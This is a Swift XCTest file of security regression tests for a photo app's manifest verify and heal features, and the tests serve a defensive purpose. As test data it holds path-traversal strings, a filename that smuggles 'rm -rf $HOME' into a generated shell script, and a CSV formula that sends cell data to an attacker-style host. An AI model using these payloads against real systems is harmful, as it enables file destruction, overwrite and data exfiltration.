import XCTest
@testable import PhotoDropMac

/// Regression tests for the manifest trust boundary.
///
/// A manifest is unauthenticated data that lives inside the tree it attests to,
/// and `verify`/`heal` accept a target the user did not necessarily produce — a
/// shared library, a folder on the card, or a `.json` handed straight to the CLI
/// (whose library root is then taken as two levels up from that file). Every
/// test here encodes an attack that worked before the containment/conflict
/// fixes; they are security assertions, not behavioural preferences.
final class ManifestTrustTests: XCTestCase {
    private func freshTempDir() throws -> URL {
        let dir = FileManager.default.temporaryDirectory
            .appendingPathComponent("PhotoDropMacTrustTests-\(UUID().uuidString)", isDirectory: true)
        try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
        addTeardownBlock { try? FileManager.default.removeItem(at: dir) }
        return dir
    }

    @discardableResult
    private func writeFile(_ relPath: String, content: String, in root: URL) throws -> String {
        let url = root.appendingPathComponent(relPath)
        try FileManager.default.createDirectory(at: url.deletingLastPathComponent(),
                                                withIntermediateDirectories: true)
        try Data(content.utf8).write(to: url)
        return String(format: "%016llx", try XxHash64.hash(fileAt: url))
    }

    private func writeManifest(into primary: URL, destinations: [URL],
                               createdAt: Date = Date(timeIntervalSince1970: 1_716_000_000),
                               stamp: Date? = nil,
                               _ entries: [ManifestEntry]) throws {
        let m = Manifest(
            schema: Manifest.schemaID, app: Manifest.appName, createdAt: createdAt, source: nil,
            primaryDestination: primary.path(percentEncoded: false),
            archiveDestination: destinations.count > 1 ? destinations[1].path(percentEncoded: false) : nil,
            destinations: destinations.map { $0.path(percentEncoded: false) },
            verified: true, partial: false, filesCopied: entries.count, filesSkipped: 0, filesFailed: 0,
            totalBytes: 0, elapsedSeconds: 0, files: entries)
        XCTAssertNotNil(ManifestWriter.write(m, intoRoot: primary, stamp: stamp ?? createdAt))
    }

    private func entry(_ path: String, hash: String) -> ManifestEntry {
        ManifestEntry(name: (path as NSString).lastPathComponent, path: path,
                      bytes: 0, xxhash64: hash, status: "verified")
    }

    // MARK: - Path containment

    func testResolveRejectsTraversal() {
        let root = URL(fileURLWithPath: "/Users/tim/Photos", isDirectory: true)
        for escape in ["../secrets.txt",
                       "../../../../etc/hosts",
                       "2026/../../outside.bin",
                       "..",
                       ""] {
            XCTAssertNil(ManifestWriter.resolve(entryPath: escape, under: root),
                         "expected \(escape.debugDescription) to be rejected as escaping the root")
        }
    }

    func testResolveAcceptsAndNormalizesInteriorPaths() throws {
        let root = URL(fileURLWithPath: "/Users/tim/Photos", isDirectory: true)
        let plain = try XCTUnwrap(ManifestWriter.resolve(entryPath: "2026/a.bin", under: root))
        XCTAssertEqual(plain.path, "/Users/tim/Photos/2026/a.bin")

        // `.` and doubled separators collapse, so callers keying on the result
        // can't be tricked into counting one file several times.
        for equivalent in ["2026/./a.bin", "2026//a.bin", "2026/x/../a.bin"] {
            XCTAssertEqual(ManifestWriter.resolve(entryPath: equivalent, under: root)?.path, plain.path)
        }

        // An absolute path is re-rooted under the library, not honored.
        XCTAssertEqual(ManifestWriter.resolve(entryPath: "/etc/passwd", under: root)?.path,
                       "/Users/tim/Photos/etc/passwd")
    }

    func testVerifyIgnoresTraversalEntries() throws {
        let tmp = try freshTempDir()
        let library = tmp.appendingPathComponent("library", isDirectory: true)
        let outside = tmp.appendingPathComponent("outside", isDirectory: true)
        let good = try writeFile("2026/a.bin", content: "good", in: library)
        let secretHash = try writeFile("secret.bin", content: "secret", in: outside)

        try writeManifest(into: library, destinations: [library], [
            entry("2026/a.bin", hash: good),
            entry("../outside/secret.bin", hash: secretHash),
        ])

        let report = try XCTUnwrap(VerifyEngine.run(target: library))
        // The escaping entry is dropped entirely — not hashed, not reported as a
        // path, so the manifest can't be used as an oracle for files outside.
        XCTAssertEqual(report.total, 1)
        XCTAssertEqual(report.verified, 1)
        XCTAssertTrue(report.allGood)
        XCTAssertFalse(report.issues.contains { $0.path.contains("secret") })
    }

    /// S-8 — an issue must name the path that was actually checked.
    ///
    /// An absolute entry path is *correctly* re-rooted under the library
    /// (`/etc/hosts` → `<lib>/etc/hosts`), but the report was built from the
    /// manifest's recorded string rather than the resolved URL, so a manifest
    /// naming `/etc/hosts` made `verify` print `MISSING /etc/hosts` — reproduced
    /// exactly. For a tool whose entire product is a trustworthy verdict line,
    /// naming a system path it never inspected is a reporting-integrity failure:
    /// it reads as a claim about that file.
    func testIssuesNameTheResolvedPathNotTheManifestString() throws {
        let tmp = try freshTempDir()
        let library = tmp.appendingPathComponent("library", isDirectory: true)
        try writeFile("2026/a.bin", content: "keep", in: library)

        try writeManifest(into: library, destinations: [library], [
            entry("/etc/hosts", hash: String(repeating: "a", count: 16)),
        ])

        let report = try XCTUnwrap(VerifyEngine.run(target: library))
        let issue = try XCTUnwrap(report.issues.first)
        XCTAssertEqual(issue.kind, .missing)
        XCTAssertEqual(issue.path, "etc/hosts",
                       "the report must name what was resolved and checked, not the manifest's string")
    }

    func testHealRestoreScriptNeverTargetsOutsideTheLibrary() throws {
        let tmp = try freshTempDir()
        let library = tmp.appendingPathComponent("library", isDirectory: true)
        let attacker = tmp.appendingPathComponent("attacker", isDirectory: true)
        let victimHash = try writeFile("victim/.zshrc", content: "payload", in: attacker)
        try writeFile("2026/keep.bin", content: "keep", in: library)

        // A crafted manifest naming an attacker directory as a "mirror" and a
        // traversing path: before containment this emitted a cp that overwrote
        // <library>/../victim/.zshrc with attacker content.
        try writeManifest(into: library, destinations: [library, attacker], [
            entry("../victim/.zshrc", hash: victimHash),
        ])

        let report = try XCTUnwrap(HealEngine.run(target: library))
        XCTAssertTrue(report.candidates.isEmpty, "traversing entry must not become a heal candidate")

        let script = HealEngine.restoreScript(report)
        XCTAssertFalse(script.contains(".zshrc"))
        XCTAssertFalse(script.contains("/../"))
    }

    // MARK: - Restore-script comment injection

    func testRestoreScriptEscapesControlCharactersInComment() throws {
        let tmp = try freshTempDir()
        let library = tmp.appendingPathComponent("library", isDirectory: true)
        let mirror = tmp.appendingPathComponent("mirror", isDirectory: true)

        // Interior newlines survive PathPlanner.sanitize, so this filename is
        // reachable from a card. In the comment it used to terminate the `#` and
        // make the rest of the name an executable script line.
        let evil = "2026/IMG\nrm -rf $HOME\n#.bin"
        let hash = try writeFile(evil, content: "content", in: mirror)
        try writeFile("2026/placeholder", content: "x", in: library)
        try writeManifest(into: library, destinations: [library, mirror], [entry(evil, hash: hash)])

        let report = try XCTUnwrap(HealEngine.run(target: library))
        XCTAssertEqual(report.recoverable.count, 1, "should be recoverable from the mirror")

        let script = HealEngine.restoreScript(report)

        // The invariant the user's review depends on: nothing that looks like a
        // command is anything but a generated mkdir/cp.
        for line in script.split(separator: "\n", omittingEmptySubsequences: false) {
            let t = line.trimmingCharacters(in: .whitespaces)
            guard !t.isEmpty, !t.hasPrefix("#"), t != "set -eu" else { continue }
            XCTAssertTrue(t.hasPrefix("mkdir -p "),
                          "every executable line must be a generated mkdir/cp, got: \(t)")
        }
        XCTAssertFalse(script.contains("\nrm -rf"), "no bare command line may appear")
        XCTAssertTrue(script.contains("# SKIPPED"), "the entry is handed back for manual handling")
        XCTAssertTrue(script.contains("\\n"), "the newline survives as an escape, so the user can see it")
    }

    func testRestoreScriptListsSourceRootsForReview() throws {
        let tmp = try freshTempDir()
        let library = tmp.appendingPathComponent("library", isDirectory: true)
        let mirror = tmp.appendingPathComponent("mirror", isDirectory: true)
        let hash = try writeFile("2026/a.bin", content: "good", in: mirror)
        try writeFile("2026/placeholder", content: "x", in: library)
        try writeManifest(into: library, destinations: [library, mirror], [entry("2026/a.bin", hash: hash)])

        let report = try XCTUnwrap(HealEngine.run(target: library))
        let script = HealEngine.restoreScript(report)
        XCTAssertTrue(script.contains("copied FROM these directories"))
        XCTAssertTrue(script.contains(mirror.appendingPathComponent("2026").path),
                      "the user must be shown where bytes are coming from")
    }

    // MARK: - Manifest disagreement

    func testConflictingManifestsAreReportedNotSilentlyResolved() throws {
        let tmp = try freshTempDir()
        let library = tmp.appendingPathComponent("library", isDirectory: true)
        let real = try writeFile("2026/a.bin", content: "original", in: library)

        try writeManifest(into: library, destinations: [library],
                          createdAt: Date(timeIntervalSince1970: 1_716_000_000),
                          [entry("2026/a.bin", hash: real)])

        // Tamper with the file, then plant a manifest dated far in the future
        // recording the tampered digest. The genuine manifest is untouched.
        let tampered = try writeFile("2026/a.bin", content: "tampered", in: library)
        try writeManifest(into: library, destinations: [library],
                          createdAt: Date(timeIntervalSince1970: 4_102_444_800),   // 2100
                          [entry("2026/a.bin", hash: tampered)])

        let report = try XCTUnwrap(VerifyEngine.run(target: library))
        XCTAssertFalse(report.allGood, "a planted manifest must not launder a tampered file")
        XCTAssertEqual(report.conflicts, 1)
        XCTAssertEqual(report.verified, 0)
    }

    func testAgreeingManifestsDedupeQuietly() throws {
        let tmp = try freshTempDir()
        let library = tmp.appendingPathComponent("library", isDirectory: true)
        let hash = try writeFile("2026/a.bin", content: "original", in: library)

        // A re-ingest re-records what it skipped: same path, same digest. That is
        // normal and must stay silent, or every repeat ingest would cry conflict.
        try writeManifest(into: library, destinations: [library],
                          createdAt: Date(timeIntervalSince1970: 1_716_000_000),
                          [entry("2026/a.bin", hash: hash)])
        try writeManifest(into: library, destinations: [library],
                          createdAt: Date(timeIntervalSince1970: 1_717_000_000),
                          [entry("2026/a.bin", hash: hash)])

        let report = try XCTUnwrap(VerifyEngine.run(target: library))
        XCTAssertTrue(report.allGood)
        XCTAssertEqual(report.conflicts, 0)
        XCTAssertEqual(report.total, 1, "the same file recorded twice is still one file")
    }

    // MARK: - CSV formula injection

    func testCSVNeutralizesFormulaLeaders() {
        // `name` is the raw card filename — the one manifest field that never
        // passes PathPlanner.sanitize — and this CSV is meant for a spreadsheet.
        let m = Manifest(
            schema: Manifest.schemaID, app: Manifest.appName,
            createdAt: Date(timeIntervalSince1970: 0), source: nil,
            primaryDestination: "/tmp", archiveDestination: nil, destinations: nil,
            verified: true, partial: false, filesCopied: 1, filesSkipped: 0, filesFailed: 0,
            totalBytes: 0, elapsedSeconds: 0,
            files: [ManifestEntry(name: #"=HYPERLINK("https://evil.tld/?"&A2,"OK").CR2"#,
                                  path: "2026/a.bin", bytes: 0, xxhash64: "0", status: "copied")])
        let csv = ManifestWriter.csv(m)
        XCTAssertFalse(csv.contains("\n=HYPERLINK"), "must not begin a cell with a live formula")
        XCTAssertTrue(csv.contains("'=HYPERLINK"))
    }

    func testCSVFieldEscaping() {
        XCTAssertEqual(ManifestWriter.csvField("plain.CR2"), "plain.CR2")
        XCTAssertEqual(ManifestWriter.csvField("=cmd"), "'=cmd")
        XCTAssertEqual(ManifestWriter.csvField("+cmd"), "'+cmd")
        XCTAssertEqual(ManifestWriter.csvField("@cmd"), "'@cmd")
        XCTAssertEqual(ManifestWriter.csvField("-cmd"), "'-cmd")
        // A bare CR would otherwise break row structure.
        XCTAssertEqual(ManifestWriter.csvField("a\rb"), "\"a\rb\"")
        XCTAssertEqual(ManifestWriter.csvField("a,b"), "\"a,b\"")
        XCTAssertEqual(ManifestWriter.csvField("say \"hi\""), "\"say \"\"hi\"\"\"")
    }

    // MARK: - The schema field is checked, not just written

    /// Regression: `schema` was written and never read, so any JSON that decoded
    /// structurally was accepted as a PhotoDrop manifest — versioning that
    /// existed only as decoration. Rejecting an unknown schema means a future
    /// format is ignored by an old build rather than misinterpreted, which is
    /// the safe direction for a file that tells `verify` what the right bytes are.
    func testManifestWithAnUnknownSchemaIsRejected() throws {
        let json = """
        {"schema":"something.else/9","app":"PhotoDropMac","createdAt":"2026-05-28T12:00:00Z",
         "primaryDestination":"/lib","destinations":["/lib"],"verified":true,
         "filesCopied":1,"filesSkipped":0,"filesFailed":0,"totalBytes":1,"elapsedSeconds":1,
         "files":[{"name":"a.bin","path":"2026/a.bin","bytes":1,"xxhash64":"0000000000000001","status":"verified"}]}
        """
        XCTAssertNil(ManifestWriter.decode(Data(json.utf8)))
    }

    func testManifestWithTheKnownSchemaStillDecodes() throws {
        let json = """
        {"schema":"\(Manifest.schemaID)","app":"PhotoDropMac","createdAt":"2026-05-28T12:00:00Z",
         "primaryDestination":"/lib","destinations":["/lib"],"verified":true,
         "filesCopied":1,"filesSkipped":0,"filesFailed":0,"totalBytes":1,"elapsedSeconds":1,
         "files":[{"name":"a.bin","path":"2026/a.bin","bytes":1,"xxhash64":"0000000000000001","status":"verified"}]}
        """
        let decoded = try XCTUnwrap(ManifestWriter.decode(Data(json.utf8)))
        XCTAssertEqual(decoded.files.count, 1)
        XCTAssertNil(decoded.partial, "a manifest written before `partial` existed still decodes")
    }
}
